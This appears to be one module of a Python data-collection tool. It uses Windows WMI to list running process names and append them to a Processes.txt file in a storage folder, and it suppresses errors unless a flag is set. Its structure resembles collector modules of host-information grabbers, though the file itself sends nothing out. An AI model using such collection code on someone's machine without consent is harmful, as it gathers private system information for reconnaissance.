from os import mkdir, path
from multiprocessing import Process

from win32com.client import GetObject


class Processes(Process):

    def __init__(self, storage_path: str, folder: str, errors: bool):
        Process.__init__(self)

        self.storage_path = storage_path
        self.folder = folder
        self.errors = errors

    def __create_folder(self):

        storage_path = rf"{self.storage_path}\{self.folder}"

        if not path.exists(storage_path):
            mkdir(storage_path)

    def __get_system_processes(self):

        results = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]

        with open(rf"{self.storage_path}\{self.folder}\Processes.txt", "a", encoding="utf-8") as processes:
            processes.write("\n".join(result for result in set(results)))

    def run(self):

        try:

            self.__create_folder()
            self.__get_system_processes()

        except Exception as e:
            if self.errors is True: print(f"[Processes]: {repr(e)}")
